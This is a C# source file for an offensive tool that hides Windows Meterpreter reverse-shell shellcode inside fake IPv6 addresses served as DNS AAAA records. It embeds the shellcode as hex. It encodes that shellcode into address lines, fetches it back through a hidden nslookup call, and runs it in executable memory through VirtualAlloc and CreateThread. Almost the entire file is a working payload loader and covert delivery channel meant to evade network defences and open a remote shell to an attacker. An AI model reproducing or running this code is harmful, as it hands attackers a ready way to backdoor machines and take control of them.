using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Diagnostics;
using System.Data;
using System.Runtime.InteropServices;

namespace NativePayload_IP6DNS
{
    class Program
    {
        static string payload = "fc4883e4f0e8cc0000004151415052"
            + "51564831d265488b5260488b521848"
            + "8b5220488b7250480fb74a4a4d31c9"
            + "4831c0ac3c617c022c2041c1c90d41"
            + "01c1e2ed524151488b52208b423c48"
            + "01d0668178180b020f85720000008b"
            + "80880000004885c074674801d0508b"
            + "4818448b40204901d0e35648ffc941"
            + "8b34884801d64d31c94831c0ac41c1"
            + "c90d4101c138e075f14c034c240845"
            + "39d175d858448b40244901d066418b"
            + "0c48448b401c4901d0418b04884801"
            + "d0415841585e595a41584159415a48"
            + "83ec204152ffe05841595a488b12e9"
            + "4bffffff5d49be7773325f33320000"
            + "41564989e64881eca00100004989e5"
            + "49bc0200115cc0a8013241544989e4"
            + "4c89f141ba4c772607ffd54c89ea68"
            + "010100005941ba29806b00ffd56a05"
            + "415e50504d31c94d31c048ffc04889"
            + "c248ffc04889c141baea0fdfe0ffd5"
            + "4889c76a1041584c89e24889f941ba"
            + "99a57461ffd585c0740a49ffce75e5"
            + "e8930000004883ec104889e24d31c9"
            + "6a0441584889f941ba02d9c85fffd5"
            + "83f8007e554883c4205e89f66a4041"
            + "59680010000041584889f24831c941"
            + "ba58a453e5ffd54889c34989c74d31"
            + "c94989f04889da4889f941ba02d9c8"
            + "5fffd583f8007d2858415759680040"
            + "000041586a005a41ba0b2f0f30ffd5"
            + "575941ba756e4d61ffd549ffcee93c"
            + "ffffff4801c34829c64885f675b441"
            + "ffe7586a005949c7c2f0b5a256ffd5";

        public static DataTable _IPV6_IPAddress_Payloads;        

        static void Main(string[] args)
        {

            try
            {              
                _IPV6_IPAddress_Payloads = new DataTable();
                
                _IPV6_IPAddress_Payloads.Columns.Add("Pay_id", typeof(int));
                _IPV6_IPAddress_Payloads.Columns.Add("Payload", typeof(string));
                _IPV6_IPAddress_Payloads.DefaultView.Sort = "Pay_id";
                _IPV6_IPAddress_Payloads.DefaultView.ToTable("Pay_id");

                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine();
                Console.WriteLine("NativePayload_IPv6DNS tool Published by Damon Mohammadbagher");
                Console.ForegroundColor = ConsoleColor.Green;                
                Console.WriteLine("Transferring Backdoor Payloads by IPv6_Address and DNS traffic ;)");
                Console.ForegroundColor = ConsoleColor.Gray;
                if (args[0].ToUpper() == "PAYLOAD") 
                {
                    Console.WriteLine("Note this code supported only 99 * 10 = 990 bytes payload ");
                    Console.WriteLine("Note this code supported only 99 lines foreach 10 bytes payload \n");

                    int c = 0;
                    int counter = 0;
                    int b = 0;
                    string temp = "";
                    foreach (char item in payload)
                    {
                        if (c >= 3)
                        { temp += item + ":"; c = 0; }
                        else if (c <= 4) { temp += item; c++; }

                        b++;

                        if (b >= 20)
                        {

                            if (counter <= 99)
                            {
                                Console.Write("fe80:" + "1111:" + temp + "ae" + counter);
                            }
                            else if (counter >= 100)
                            {
                                Console.Write("fe80:" + "1111:" + temp + "a" + counter);
                            }
                            else if (counter >= 999)
                            {
                                Console.Write("fe80:" + "1111:" + temp + "" + counter);
                            }
                            Console.WriteLine(""); b = 0;
                            temp = "";
                            counter++;
                        }

                    }
                    
                }else if (args[0].ToUpper() == "NULL")
                {
                    Console.WriteLine("Note this code supported only 99 * 10 = 990 bytes payload ");
                    Console.WriteLine("Note this code supported only 99 lines foreach 10 bytes payload \n");
                   
                        payload = args[1];
                        int c = 0;
                        int counter = 0;
                        int b = 0;
                        string temp = "";
                        foreach (char item in payload)
                        {
                            if (c >= 3)
                            { temp += item + ":"; c = 0; }
                            else if (c <= 4) { temp += item; c++; }

                            b++;

                            if (b >= 20)
                            {

                                if (counter <= 99)
                                {
                                    Console.Write("fe80:" + "1111:" + temp + "ae" + counter);
                                }
                                else if (counter >= 100)
                                {
                                    Console.Write("fe80:" + "1111:" + temp + "a" + counter);
                                }
                                else if (counter >= 999)
                                {
                                    Console.Write("fe80:" + "1111:" + temp + "" + counter);
                                }
                                Console.WriteLine(""); b = 0;
                                temp = "";
                                counter++;
                            }

                        }
                    
                }
                else
                {
                    try
                    {
                       __nslookup(args[0], args[1]);

                        Exploit(_IPV6_IPAddress_Payloads);
                    }
                    catch (Exception exp)
                    {
                        Console.WriteLine("Main exploit : " + exp.Message);
                    }                    
                }

            }
            catch (Exception main)
            {
                Console.WriteLine("Main : " + main.Message);
            }

        }

        static void Exploit(DataTable payloads)
        {
            string ss = "";
            byte[] __Bytes = new byte[payloads.Rows.Count * 2];
            for (int i = 0; i < payloads.Rows.Count; i++)
            {
                try
                {
                    // with Round-robin this code was necessary to sort payloads ;)
                    EnumerableRowCollection filter = payloads.AsEnumerable().Where(r => r.Field<int>("Pay_id") == i);
                    foreach (DataRow item in filter)
                    {
                        ss += item.ItemArray[1].ToString();
                    }
                }
                catch (Exception)
                {


                }
            }
            try
            {
                Console.Write("");
                int Oonagi = payloads.Rows.Count * 2;
                int t = 0;
                for (int k = 0; k < Oonagi; k++)
                {
                    string _tmp1 = ss.Substring(t, 2);
                    byte current1 = Convert.ToByte(_tmp1, 16);
                    // debug only , print payload string
                    Console.Write(_tmp1);
                    __Bytes[k] = current1;
                    t++;
                    t++;

                }

                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Bingo Meterpreter session by IPv6_Address and DNS traffic ;)");
                Console.WriteLine("DNS Round-Robin Supported");
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception ops1)
            {

                Console.WriteLine("Exploit: " + ops1.Message);
            }
        }
                                   
        public static void __nslookup(string DNS_AAAA_A, string DnsServer)
        {
          
            int breakpoint_1 = 0;
            string last_octet_tmp = "";
            
            /// Length for injected payloads by IPv6 Addresss 
            int Final_payload_count = 0;          
           
            try
            {

                /// Make DNS traffic for getting Meterpreter Payloads by nslookup
                ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("nslookup.exe", DNS_AAAA_A + " " + DnsServer);
                ns_Prcs_info.RedirectStandardInput = true;
                ns_Prcs_info.RedirectStandardOutput = true;
                ns_Prcs_info.UseShellExecute = false;
                /// you can use Thread Sleep here 

                Process nslookup = new Process();
                nslookup.StartInfo = ns_Prcs_info;
                nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                nslookup.Start();
                
                string result_Line0 = "";
                string computerList = nslookup.StandardOutput.ReadToEnd();
                string[] All_lines = computerList.Split('\t', 'n');
                int PayloadLines_current_id = 0;



                /// Getting First Line of Meterpreter Payload Lines ;)
                /// Getting First Line of Meterpreter Payload Lines ;)
                try
                {                                                        
                    for (int x = 0; x < All_lines.Length; x++)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        if (All_lines[x].ToUpper().Contains("ADDRESSES:"))
                        {
                            /// Getting First Line of Meterpreter Payload Lines ;)
                            int f = All_lines[x].IndexOf("Addresses:  ") + "Addresses:  ".Length;
                            int l = All_lines[x].LastIndexOf("\r\n");
                            result_Line0 = All_lines[x].Substring(f, l - f);
                            breakpoint_1 = x;
                            break;
                        }


                    }
                    Console.WriteLine();
                    // Debug only {show address line 0}
                    //Console.Write(result_Line0);
                    Console.WriteLine();
                    /// normalize Address 0:0:0 ==> 0000:0000:0000
                    /// normalize Address 0:0:0 ==> 0000:0000:0000
                    string[] temp_normalize0 = result_Line0.Split(':');

                    /// finding hidden zero in address octets ;)
                    for (int ix = 0; ix < temp_normalize0.Length; ix++)
                    {
                        int count = temp_normalize0[ix].Length;
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        if (count < 4)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            for (int j = 0; j < 4 - count; j++)
                            {
                                temp_normalize0[ix] = "0" + temp_normalize0[ix];
                            }
                        }
                        if (ix == temp_normalize0.Length - 1) { Console.ForegroundColor = ConsoleColor.DarkCyan; }
                        if (ix < temp_normalize0.Length - 6 && ix >= temp_normalize0.Length - 8) { Console.ForegroundColor = ConsoleColor.DarkCyan; }
                        if (ix == temp_normalize0.Length - 2 || ix == temp_normalize0.Length - 3 || ix == temp_normalize0.Length - 4 || ix == temp_normalize0.Length - 5 || ix == temp_normalize0.Length - 6)
                        {
                           //// dump Injected Payloads from IPv6 Address to List ;)
                           //// Note this code supported only 99 * 10 = 990 bytes payload 
                           //// you can change here to getting more than 990 bytes 
                         
                             if (temp_normalize0[7].StartsWith("ae"))
                             {
                                 object[] __X = {Convert.ToInt32(temp_normalize0[7].Remove(0,2)), temp_normalize0[ix]};
                                 _IPV6_IPAddress_Payloads.Rows.Add(__X);

                             } else if(temp_normalize0[7].StartsWith("0ae"))
                             {
                                 object[] __X = {Convert.ToInt32(temp_normalize0[7].Remove(0,3)), temp_normalize0[ix]};
                                 _IPV6_IPAddress_Payloads.Rows.Add(__X);
                             }

                             //// you can change here to getting more than 990 bytes 

                             //else if (temp_normalize0[7].StartsWith("a"))
                             //{
                             //    object[] __X = { Convert.ToInt32(temp_normalize0[7].Remove(0, 1)), temp_normalize0[ix] };
                             //    _IPV6_IPAddress_Payloads.Rows.Add(__X);
                             //}                                                    
                        }

                        Console.Write(temp_normalize0[ix] + " ");                      

                        // checking Bytes and Sorting
                        last_octet_tmp = "";
                        if (ix == temp_normalize0.Length - 1)
                        {
                            // this is last octet of IPv6 address
                            last_octet_tmp += temp_normalize0[ix];

                        }
                    }
                    // Debug only {show address line 0}
                    Console.Write(" ==> " + result_Line0);
                    Console.WriteLine();
                    //last_octet_tmp = String.Format("{0:x2}{1:x2}{2:x2}");
                    try
                    {
                        if (last_octet_tmp.StartsWith("ae"))
                        {  
                                                       
                            PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 2));
                           
                            Final_payload_count++;
                        }
                        else if (last_octet_tmp.StartsWith("0ae"))
                        {
                                                    
                            PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 3));
                          
                            Final_payload_count++;
                        }
                    }
                    catch (Exception e0)
                    {

                        Console.WriteLine("e0 : " + e0.Message);
                    }
                    /// Getting First Line of Meterpreter Payload Lines ;)
                    /// Getting First Line of Meterpreter Payload Lines ;)

                }
                catch (Exception e00)
                {
                    Console.WriteLine("e00 : " + e00.Message);
                    
                }




                /// Getting Line by Line Payloads  ;)
                /// line17 ==>   fe80:1111:1c49:1d0:418b:488:4801:ae17
                /// line18 ==>   fe80:1111:d041:5841:585e:595a:4158:ae18
                /// fe80:1111:4a4a:4d31:c948:31c0:ac3c:ae4  ====> {fe80:1111:}{4a4a:4d31:c948:31c0:ac3c}{:ae4}
                /// Static Address octet = {fe80:1111:} , Payload [10 bytes] = {4a4a:4d31:c948:31c0:ac3c} , Counter Lines = {:ae4}            
                /// Getting Line by Line Payloads  ;)
                try
                {
                    string result_Line_X = "";
                    int end = 0;
                    for (int xx = breakpoint_1+1 ; xx < All_lines.Length; xx++ )
                    {
                        if (xx < All_lines.Length)
                        {
                            end = All_lines[xx].LastIndexOf("\r\n");
                        }
                        else if (xx == All_lines.Length - 1)
                        {
                            end = All_lines[xx].LastIndexOf("\r\n\r\n");
                        }
                        result_Line_X = All_lines[xx].Substring(2, end - 2);
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                           
                        // Debug only {show address}
                        //Console.WriteLine(result_Line_X);
                       
                        


                        /// normalize Address 0:0:0 ==> 0000:0000:0000
                        /// normalize Address 0:0:0 ==> 0000:0000:0000
                        string[] temp_normalize = result_Line_X.Split(':');

                        /// finding hidden zero in adress octets ;)
                        for (int ix = 0; ix < temp_normalize.Length; ix++)
                        {
                            int count = temp_normalize[ix].Length;
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            if (count < 4)
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                for (int j = 0; j < 4 - count; j++)
                                {
                                    temp_normalize[ix] = "0" + temp_normalize[ix];
                                }
                            }
                            if (ix == temp_normalize.Length - 1) { Console.ForegroundColor = ConsoleColor.DarkCyan; }
                            if (ix < temp_normalize.Length - 6 && ix >= temp_normalize.Length - 8) { Console.ForegroundColor = ConsoleColor.DarkCyan; }
                            if (ix == temp_normalize.Length - 2 || ix == temp_normalize.Length - 3 || ix == temp_normalize.Length - 4 || ix == temp_normalize.Length - 5 || ix == temp_normalize.Length - 6) 
                            {
                                //// dump Injected Payloads from IPv6 Address to List ;)
                                //// Note this code supported only 99 * 10 = 990 bytes payload 
                                //// you can change here to getting more than 990 bytes 

                                if (temp_normalize[7].StartsWith("ae"))
                                {
                                    object[] __X = { Convert.ToInt32(temp_normalize[7].Remove(0, 2)), temp_normalize[ix] };
                                    _IPV6_IPAddress_Payloads.Rows.Add(__X);

                                }
                                else if (temp_normalize[7].StartsWith("0ae"))
                                {
                                    object[] __X = { Convert.ToInt32(temp_normalize[7].Remove(0, 3)), temp_normalize[ix] };
                                    _IPV6_IPAddress_Payloads.Rows.Add(__X);
                                }
                                //// you can change here to getting more than 990 bytes 

                                //else if (temp_normalize[7].StartsWith("a"))
                                //{
                                //    object[] __X = { Convert.ToInt32(temp_normalize[7].Remove(0, 1)), temp_normalize[ix] };
                                //    _IPV6_IPAddress_Payloads.Rows.Add(__X);
                                //}                            

                            }
                            Console.Write(temp_normalize[ix] + " ");


                            // checking Bytes and Sorting
                            last_octet_tmp = "";
                            if (ix == temp_normalize.Length - 1)
                            {
                                // this is last octet of IPv6 address
                                last_octet_tmp += temp_normalize[ix];

                            }
                        }
                        // Debug only {show address}
                        Console.WriteLine(" ==> " + result_Line_X);
                        //Console.WriteLine();
                        try
                        {
                            //last_octet_tmp = String.Format("{0:x2}{1:x2}{2:x2}");
                            if (last_octet_tmp.StartsWith("ae"))
                            {
                              
                                PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 2));
                              
                                Final_payload_count++;
                            }
                            else if (last_octet_tmp.StartsWith("0ae"))
                            {
                              
                                PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 3));
                              
                                Final_payload_count++;
                            }
                        }
                        catch (Exception e1)
                        {
                            Console.WriteLine("e1 : " + e1.Message);

                        }                       
                        /// normalize Address 0:0:0 ==> 0000:0000:0000
                        /// normalize Address 0:0:0 ==> 0000:0000:0000
                    }
                    Console.WriteLine("PAYLOAD Lines Count: "+Final_payload_count.ToString());
                }
                catch (Exception e4)
                {

                    Console.WriteLine("e4 : " + e4.Message);
                }
              
            }
            catch (Exception e)
            {
             
                Console.WriteLine(e.Message);
              
             
            }
          
        }

        
        
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     

    }
}
